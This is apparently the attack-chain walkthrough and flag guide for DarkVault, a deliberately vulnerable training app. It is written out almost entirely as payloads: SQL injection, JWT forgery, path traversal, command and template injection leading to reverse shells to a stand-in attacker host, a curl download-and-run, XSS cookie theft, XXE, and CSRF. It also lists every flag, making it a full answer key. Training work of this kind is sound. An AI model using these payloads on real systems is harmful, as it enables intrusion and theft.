# DarkVault Attack Chains

This document outlines detailed attack chains for exploiting vulnerabilities in DarkVault. Each chain demonstrates a complete attack path from initial access to full system compromise or data exfiltration.

## Table of Contents
1. [Authentication Bypass Chains](#authentication-bypass-chains)
2. [Privilege Escalation Chains](#privilege-escalation-chains)
3. [Data Exfiltration Chains](#data-exfiltration-chains)
4. [Remote Code Execution Chains](#remote-code-execution-chains)
5. [Client-Side Attack Chains](#client-side-attack-chains)
6. [Combined Attack Scenarios](#combined-attack-scenarios)

## Authentication Bypass Chains

### SQL Injection Authentication Bypass
**Vulnerability**: SQL injection in login form
**Target**: `/login` and `/user/login` endpoints
**Objective**: Gain unauthorized access to the application

**Attack Chain**:
1. Navigate to login page at `/login`
2. In the username field, enter: `' OR 1=1 --`
3. In the password field, enter any value (will be ignored)
4. Submit the form to bypass authentication
5. Observe successful login as the first user in the database (usually admin)

**Detailed Explanation**:
The login form is vulnerable to SQL injection. The application constructs a query like:
```sql
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[HASHED_PASSWORD]'
```

By entering `' OR 1=1 --`, we modify the query to:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '[HASHED_PASSWORD]'
```

This makes the query return the first user in the database regardless of username or password, effectively bypassing authentication.

**Achievement**: Flag `DARK{sql_m4st3r}`

### JWT Token Forgery
**Vulnerability**: Weak JWT implementation
**Target**: `/api/auth` endpoint
**Objective**: Create forged JWT token to access protected resources

**Attack Chain**:
1. Obtain a legitimate JWT token by logging in normally
2. Decode the JWT token using [jwt.io](https://jwt.io)
3. Identify the token structure and signing algorithm
4. Extract the secret key (`darkvault-secret-key`) from source code or brute force
5. Modify the payload to elevate privileges:
   ```json
   {
     "id": 1,
     "username": "forged_user",
     "isAdmin": true,
     "role": "admin"
   }
   ```
6. Sign the token with the extracted secret
7. Replace the original token with the forged one in requests
8. Access protected admin resources

**Detailed Explanation**:
The application uses a weak, hardcoded secret key for JWT signing. The token doesn't validate the issuer, audience, or have proper expiration, making it easy to forge tokens with elevated privileges.

**Achievement**: Flag `DARK{jwt_4dm1n_3sc4l4t10n}`

### Session Fixation Attack
**Vulnerability**: Session fixation vulnerability
**Target**: `/user/session-fixation` endpoint
**Objective**: Hijack a user's authenticated session

**Attack Chain**:
1. Generate a URL with a known session ID: `/user/session-fixation?sessionId=ATTACKER_KNOWN_SESSION`
2. Send this URL to the victim
3. Victim visits the URL, which sets their session ID to the attacker-known value
4. Victim logs in normally
5. The application doesn't regenerate the session ID after login
6. Attacker uses the known session ID to access the victim's authenticated session

**Detailed Explanation**:
The application allows setting session IDs via URL parameters and doesn't regenerate session IDs after authentication, creating a session fixation vulnerability.

## Privilege Escalation Chains

### Vertical Privilege Escalation via JWT
**Vulnerability**: JWT token manipulation
**Target**: Admin functionality
**Objective**: Escalate privileges from regular user to administrator

**Attack Chain**:
1. Register and login as a regular user
2. Capture the JWT token from the request
3. Decode the token using [jwt.io](https://jwt.io)
4. Modify the payload to set `isAdmin` to `true` and `role` to `admin`
5. Re-sign the token with the known secret key
6. Replace the original token in subsequent requests
7. Access `/admin` dashboard and administrative APIs

**Technical Details**:
Original token payload:
```json
{
  "id": 2,
  "username": "user1",
  "isAdmin": false,
  "role": "user"
}
```

Modified token payload:
```json
{
  "id": 2,
  "username": "user1",
  "isAdmin": true,
  "role": "admin"
}
```

**Achievement**: Flag `DARK{jwt_4dm1n_3sc4l4t10n}`

### Horizontal Privilege Escalation via IDOR
**Vulnerability**: Insecure Direct Object References
**Target**: User profiles and data
**Objective**: Access another user's private information

**Attack Chain**:
1. Login as a regular user
2. Navigate to your own profile at `/user/[YOUR_ID]`
3. Change the ID in the URL to another user's ID
4. View unauthorized profile information and private data
5. Systematically enumerate all user IDs to harvest data

**Special Cases**:
- Access user ID 9999 at `/user/9999` to discover hidden admin account
- Find special flag: `DARK{1d0r_vuln3r4b1l1ty}`

### Parameter Tampering for Admin Access
**Vulnerability**: Insecure parameter validation
**Target**: Admin-only API endpoints
**Objective**: Bypass authorization checks

**Attack Chain**:
1. Login as a regular user
2. Attempt to access `/api/admin/users` (access denied)
3. Modify request to include parameter: `/api/admin/users?admin=true`
4. Bypass authorization check and access admin functionality

**Detailed Explanation**:
The server-side code contains a backdoor in the admin check middleware:
```javascript
const isAdmin = (req, res, next) => {
  if (req.user && (req.user.isAdmin || req.user.role === 'admin')) {
    next();
  } else {
    // Check for backdoor parameter (intentional vulnerability)
    if (req.query.admin === 'true') {
      next();
    } else {
      res.status(403).json({ error: 'Admin access required' });
    }
  }
};
```

## Data Exfiltration Chains

### SQL Injection Data Extraction
**Vulnerability**: SQL injection in search functionality
**Target**: Database content
**Objective**: Extract sensitive data from database

**Attack Chain**:
1. Access search functionality
2. Test for SQL injection with a single quote (`'`)
3. Confirm vulnerability with basic test: `' OR 1=1--`
4. Determine number of columns with UNION query: `' UNION SELECT 1,2,3,4,5,6,7--`
5. Identify which columns are displayed in the results
6. Extract database information:
   - Database version: `' UNION SELECT 1,2,sqlite_version(),4,5,6,7--`
   - Table names: `' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master WHERE type='table'--`
   - User credentials: `' UNION SELECT 1,2,username,password,email,6,7 FROM users--`
7. Extract MD5 password hashes
8. Crack hashes offline (e.g., `5f4dcc3b5aa765d61d8327deb882cf99` = `SecretPassword123!`)

**Achievement**: Flag `DARK{sql_m4st3r}`

### GraphQL Data Extraction
**Vulnerability**: GraphQL introspection and excessive data exposure
**Target**: `/api/graphql` endpoint
**Objective**: Extract schema and sensitive data

**Attack Chain**:
1. Discover GraphQL endpoint at `/api/graphql`
2. Send introspection query to map the API:
   ```graphql
   {
     __schema {
       types {
         name
         fields {
           name
           type {
             name
             kind
           }
         }
       }
     }
   }
   ```
3. Identify sensitive fields like `password`, `creditCardNumber`, and `apiKey`
4. Craft query to extract sensitive data:
   ```graphql
   {
     getUserData(id: "1") {
       username
       password
       email
       creditCardNumber
       apiKey
     }
   }
   ```
5. Extract data from multiple users by iterating through IDs

**Achievement**: Flag `DARK{gr4phql_1ntr0sp3ct10n}`

### Path Traversal for Configuration Disclosure
**Vulnerability**: Path traversal in file access
**Target**: Sensitive server files
**Objective**: Extract configuration and credentials

**Attack Chain**:
1. Identify file access functionality at `/api/file?name=example.txt`
2. Test for path traversal with `../` sequences: `/api/file?name=../config.json`
3. Access sensitive files:
   - Application configuration: `/api/file?name=../config.json`
   - Source code: `/api/file?name=../app.js`
   - Environment variables: `/api/file?name=../.env`
4. Extract hardcoded credentials and secrets

**Achievement**: Flag `DARK{p4th_tr4v3rs4l_m4st3r}`

## Remote Code Execution Chains

### Command Injection RCE
**Vulnerability**: Command injection in ping tool
**Target**: Server OS
**Objective**: Execute arbitrary commands on the server

**Attack Chain**:
1. Access ping functionality at `/ping`
2. Test for command injection with simple payload: `localhost; id`
3. Confirm successful command execution in response
4. Read sensitive files: `localhost; cat /etc/passwd`
5. Enumerate system information: `localhost; uname -a; whoami; id`
6. Establish persistence by creating backdoor: `localhost; echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh`
7. Execute reverse shell: `localhost; /tmp/backdoor.sh`

**Achievement**: Flag `DARK{c0mm4nd_1nj3ct10n_pr0}`

### Server-Side Template Injection RCE
**Vulnerability**: Template injection in rendering engine
**Target**: Server application
**Objective**: Execute arbitrary code on the server

**Attack Chain**:
1. Access template rendering functionality at `/render-template`
2. Test for SSTI with simple payload: `${7*7}`
3. Confirm successful evaluation (result: 49)
4. Escalate to environment disclosure: `${process.env}`
5. Achieve code execution:
   ```
   ${process.mainModule.require('child_process').execSync('id')}
   ```
6. Read sensitive files:
   ```
   ${process.mainModule.require('fs').readFileSync('/etc/passwd')}
   ```
7. Establish reverse shell:
   ```
   ${process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"')}
   ```

**Achievement**: Flag `DARK{t3mpl4t3_1nj3ct10n}`

### XXE Injection for Data Extraction and SSRF
**Vulnerability**: XML External Entity injection
**Target**: XML processing functionality
**Objective**: Read local files and perform SSRF

**Attack Chain**:
1. Identify XML processing at `/api/import-xml`
2. Create malicious XML with XXE payload:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```
3. Submit XML to extract local files
4. Modify payload for SSRF:
   ```xml
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
   ]>
   ```
5. Use SSRF to access internal services and localhost endpoints

**Achievement**: Flag `DARK{xxe_data_extr4ct0r}`

## Client-Side Attack Chains

### DOM-based XSS Attack
**Vulnerability**: DOM-based XSS in client-side rendering
**Target**: Other users' browsers
**Objective**: Execute JavaScript in victim browsers

**Attack Chain**:
1. Access client-side rendering page at `/client-render`
2. Test with basic XSS payload: `<script>alert(1)</script>`
3. Observe script execution in the browser
4. Craft payload to steal cookies:
   ```html
   <img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```
5. Create URL with payload: `/client-render?message=<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
6. Send URL to victims
7. Collect cookies from victim browsers

**Achievement**: Flag `DARK{xss_3xpl01t3r}`

### Prototype Pollution Attack
**Vulnerability**: Prototype pollution in JavaScript
**Target**: Application logic
**Objective**: Modify Object prototype to affect application behavior

**Attack Chain**:
1. Identify endpoint vulnerable to prototype pollution at `/api/merge-config`
2. Create payload to pollute Object prototype:
   ```json
   {
     "__proto__": {
       "isAdmin": true
     }
   }
   ```
3. Submit payload to endpoint
4. Verify pollution with check for `Object.prototype.isAdmin`
5. Observe behavior changes across the application
6. Achieve privilege escalation through prototype pollution

**Achievement**: Flag `DARK{pr0t0typ3_p0llut10n_m4st3r}`

### CSRF Attack for Account Takeover
**Vulnerability**: Missing CSRF protection
**Target**: State-changing functionality
**Objective**: Perform actions on behalf of victims

**Attack Chain**:
1. Identify state-changing function without CSRF token (e.g., password change)
2. Create malicious HTML form:
   ```html
   <form action="https://darkvault.local/user/change-password" method="POST" id="csrf-form">
     <input type="hidden" name="new_password" value="attacker_password">
     <input type="hidden" name="confirm_password" value="attacker_password">
   </form>
   <script>document.getElementById("csrf-form").submit();</script>
   ```
3. Host malicious page or embed in XSS payload
4. Trick victim into visiting malicious page
5. Form automatically submits, changing victim's password

**Achievement**: Flag `DARK{csrf_pr0t3ct10n_byp4ss3d}`

## Combined Attack Scenarios

### Complete Server Compromise
**Objective**: Full control of the application server

**Combined Attack Chain**:
1. **Initial Access**:
   - Bypass authentication with SQL injection: `' OR 1=1--`
   - Login as administrator

2. **Reconnaissance**:
   - Explore admin panel at `/admin`
   - Access site map at `/site-map`
   - Enumerate API endpoints at `/api`

3. **Exploitation**:
   - Identify command injection in ping tool at `/ping`
   - Test with payload: `localhost; id`
   - Execute reconnaissance commands: `localhost; whoami; id; uname -a`

4. **Persistence**:
   - Create backdoor account: `localhost; curl -X POST http://localhost:3000/api/auth/register -d "username=backdoor&password=backdoor&email=backdoor@attacker.com&role=admin"`
   - Or create backdoor file: `localhost; echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh`

5. **Data Exfiltration**:
   - Extract database: `localhost; sqlite3 darkvault.db .dump > /tmp/dump.sql; cat /tmp/dump.sql`
   - Retrieve configuration: `localhost; cat config.json`
   - List environment variables: `localhost; env`

6. **Privilege Escalation (if running as limited user)**:
   - Check for SUID binaries: `localhost; find / -perm -4000 -type f 2>/dev/null`
   - Explore sudo privileges: `localhost; sudo -l`
   - Exploit local privilege escalation vulnerabilities

7. **Full Compromise**:
   - Establish persistent reverse shell: `localhost; bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'`
   - Download additional tools: `localhost; curl -o /tmp/tool.sh http://attacker.com/tool.sh; chmod +x /tmp/tool.sh; /tmp/tool.sh`
   - Complete control of the server

### Full Data Breach
**Objective**: Extract all sensitive data from the application

**Combined Attack Chain**:
1. **Initial Access**:
   - Bypass authentication with SQL injection: `' OR 1=1--`

2. **Database Exfiltration**:
   - Extract database schema: `' UNION SELECT 1,2,sql,4,5,6,7 FROM sqlite_master WHERE type='table'--`
   - Extract user credentials: `' UNION SELECT 1,2,username,password,email,6,7 FROM users--`
   - Extract sensitive data from all tables systematically

3. **File System Access**:
   - Use path traversal to access configuration: `/api/file?name=../config.json`
   - Access source code: `/api/file?name=../app.js`
   - Access environment variables: `/api/file?name=../.env`

4. **API Data Harvesting**:
   - Use GraphQL introspection to map data: 
     ```graphql
     {
       __schema {
         types {
           name
           fields {
             name
           }
         }
       }
     }
     ```
   - Extract all data through GraphQL queries

5. **Client-Side Data**:
   - Deploy XSS payload to collect user cookies
   - Hijack sessions to access additional user data

6. **Complete Data Extraction**:
   - Combine all collected data
   - Organize extracted information by sensitivity
   - Create complete data breach report

### User Account Takeover
**Objective**: Complete control of victim accounts

**Combined Attack Chain**:
1. **Information Gathering**:
   - Enumerate users through IDOR at `/user/1`, `/user/2`, etc.
   - Collect usernames for targeted attacks

2. **Password Reset Attack**:
   - Access weak password reset functionality at `/user/forgot-password`
   - Analyze reset token pattern (vulnerable token generation)
   - Predict reset tokens based on username and timestamp
   - Reset victim's password

3. **Session Hijacking**:
   - Identify session fixation vulnerability at `/user/session-fixation`
   - Set victim's session to known value
   - Wait for victim login
   - Hijack authenticated session

4. **XSS-Based Attack**:
   - Deploy stored XSS in message board: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
   - Capture victim's cookies
   - Use cookies to impersonate victims

5. **CSRF Attack**:
   - Create CSRF payload targeting account modification functions
   - Distribute via XSS or social engineering
   - Modify victim's account details

6. **Complete Account Takeover**:
   - Gain access to victim accounts through multiple vectors
   - Change credentials to maintain persistence
   - Extract sensitive information from compromised accounts

## Flag Collection Guide

DarkVault contains several flags hidden throughout the application. Below is a guide to finding all flags:

1. **SQL Injection Flag**: `DARK{sql_m4st3r}`
   - Bypass login with SQL injection
   - Flag appears in session after successful SQL injection

2. **Path Traversal Flag**: `DARK{p4th_tr4v3rs4l_m4st3r}`
   - Access `/api/file?name=../../../etc/darkflag`
   - Flag is contained in the file

3. **Command Injection Flag**: `DARK{c0mm4nd_1nj3ct10n_pr0}`
   - Use command injection in ping tool
   - Execute `localhost; cat /opt/flag.txt`

4. **JWT Manipulation Flag**: `DARK{jwt_4dm1n_3sc4l4t10n}`
   - Forge admin JWT token
   - Access `/api/admin/dashboard`

5. **IDOR Flag**: `DARK{1d0r_vuln3r4b1l1ty}`
   - Access user ID 9999 via `/user/9999`
   - Flag appears in the profile

6. **XSS Flag**: `DARK{xss_3xpl01t3r}`
   - Execute XSS in message board
   - Flag is stored in document.cookie

7. **XXE Flag**: `DARK{xxe_data_extr4ct0r}`
   - Exploit XXE to read `/opt/xxe_flag.txt`

8. **GraphQL Flag**: `DARK{gr4phql_1ntr0sp3ct10n}`
   - Perform GraphQL introspection
   - Query the hidden `secretFlag` field

9. **Race Condition Flag**: `DARK{r4c3_c0nd1t10n_3xpl01t3d}`
   - Send multiple concurrent requests to `/api/update-balance`
   - Flag appears after successful exploitation

10. **CSRF Flag**: `DARK{csrf_pr0t3ct10n_byp4ss3d}`
    - Exploit CSRF vulnerability in state-changing functions
    - Flag appears after successful CSRF attack

11. **Template Injection Flag**: `DARK{t3mpl4t3_1nj3ct10n}`
    - Achieve RCE via template injection
    - Read flag from `/opt/ssti_flag.txt`

12. **Prototype Pollution Flag**: `DARK{pr0t0typ3_p0llut10n_m4st3r}`
    - Successfully exploit prototype pollution
    - Access `/api/check-prototype` with polluted Object

13. **Weak Encryption Flag**: `DARK{w34k_crypt0_3xpl01t3d}`
    - Decrypt data from `/api/export` endpoint
    - Flag is within the decrypted data

14. **File Upload Flag**: `DARK{f1l3_upl04d_byp4ss3d}`
    - Bypass upload restrictions to upload webshell
    - Execute webshell to read flag

15. **NoSQL Injection Flag**: `DARK{n0sql_1nj3ct10n_m4st3r}`
    - Use NoSQL injection operators in MongoDB simulation
    - Flag appears after successful extraction 